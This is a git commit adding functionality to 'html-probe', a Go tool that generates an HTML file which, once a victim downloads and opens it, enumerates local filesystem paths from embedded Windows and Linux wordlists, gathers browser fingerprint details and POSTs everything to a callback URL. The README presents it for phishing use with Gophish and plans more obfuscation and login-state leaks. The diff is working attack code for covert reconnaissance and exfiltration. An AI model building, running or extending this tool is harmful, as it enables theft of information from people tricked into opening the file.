2d239d6fe3d9c2885d6cfd60ff6d059786455ef8
Ronni Skansing <rsk@prueba.dk>
2023-11-08 11:10:59 +0100

    functional

--- README.md
+++ README.md
@@ -1,1 +1,22 @@
-# html-probe
+# Description
+Generates a .HTML file that upon opening via. the file:// protocol (download and open) probes
+the hosts filesystem to exfiltrate information that can be used later on.
+
+The .HTML will send a POST request to the callback URL with form encoded data.
+
+# Usage
+ 
+ Simple usage - replace callback with were you want the data sent.
+`htmlprobe -callback "https://example.com/callback"`
+
+Gophish usage
+`htmlprobe -callback "{{.URL}}"`
+
+# Ideas
+ - Based on the path of the opened file, which most oftenly would be in the Downloads folder,
+it should be possible to know (atleast on windows) which language i used, and use that 
+prefix for the file enumeration.
+ - Pull in dictionaries after loading the script, this could depend on initial analysis (OS, language etc)
+ - After submission callback, a method that is to be called after the probe callback has happend.
+ - More obfuscation techniques. 
+ - It is possible to identify some login on other sites via. loading images that have different urls depending on state, see social media leaks.
--- main.go
+++ main.go
@@ -12,10 +12,16 @@ import (
 //go:embed lists/drives.txt
 var embeddedDrives string
 
+//go:embed lists/linux.txt
+var embbededLinux string
+
+//go:embed lists/windows.txt
+var embbededWindows string
+
 func main() {
 	outputToFileFlag := flag.String("output", "out.html", "File to save to")
 	// mixIntoFileFlag := flag.String("mix", "", "Mixes the generated script with HTML file.")
-	callbackFlag := flag.String("callback", "", "The URL to POST the data to when the file is opened")
+	callbackFlag := flag.String("callback", "", "The URL to POST the data to when the file is opened - Ex. https://example.com/callback")
 	wordlistFlag := flag.String("list", "", "Custom wordlist - Each line must be seperated by newlines \\n")
 
 	flag.Parse()
@@ -26,7 +32,6 @@ func main() {
 	if len(*callbackFlag) == 0 {
 		log.Fatal("No callback assigned. Assign one via. the -callback flag.")
 	}
-
 	// create the word lists to check for
 	dict := []string{}
 	if len(*wordlistFlag) > 0 {
@@ -38,6 +43,8 @@ func main() {
 		dict = strings.Split(ft, "\n")
 	} else {
 		dict = strings.Split(embeddedDrives, "\n")
+		dict = append(dict, strings.Split(embbededLinux, "\n")...)
+		dict = append(dict, strings.Split(embbededWindows, "\n")...)
 	}
 	list := []string{}
 	for _, word := range dict {
@@ -54,9 +61,15 @@ func main() {
 	flatList := strings.Join(list, "")
 
 	js := strings.TrimSpace(fmt.Sprintf(`
+const sendTarget = "%s";
 const data = {};
-data.path = location.href; 
 data.probe = {};
+data.probe.currentPath = location.href;
+data.probe.currentLocation = location.href;
+data.probe.browserUserAgent = navigator.userAgent;
+data.probe.browserLanguage = navigator.language;
+data.probe.browserPlatform = navigator.platform;
+data.probe.browserScreen = screen.width + "x" + screen.height
 
 const lists = [%s];
 const waitGroup = {
@@ -92,6 +105,7 @@ const submitForm = () => {
     const input = document.createElement('input');
     input.type = 'text';
     input.name = path;
+	input.setAttribute('value', data.probe[path]);
     form.appendChild(input);
   })
   const inputSubmit = document.createElement('input');
@@ -117,7 +131,30 @@ var id = setInterval(() => {
     submitForm()
   }
 }, 500)
-`, flatList))
+`, *callbackFlag, flatList))
 
-	fmt.Println(js)
+	html := strings.TrimSpace(fmt.Sprintf(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    Hello
+
+	<script>
+  		%s
+	</script>
+</body>
+</html>
+  `, js))
+
+	err := os.WriteFile(*outputToFileFlag, []byte(html), os.ModePerm)
+	if err != nil {
+		log.Fatalf("failed to write to file: %s", err)
+	}
+
+	fmt.Printf("output written to '%s'\n", *outputToFileFlag)
 }
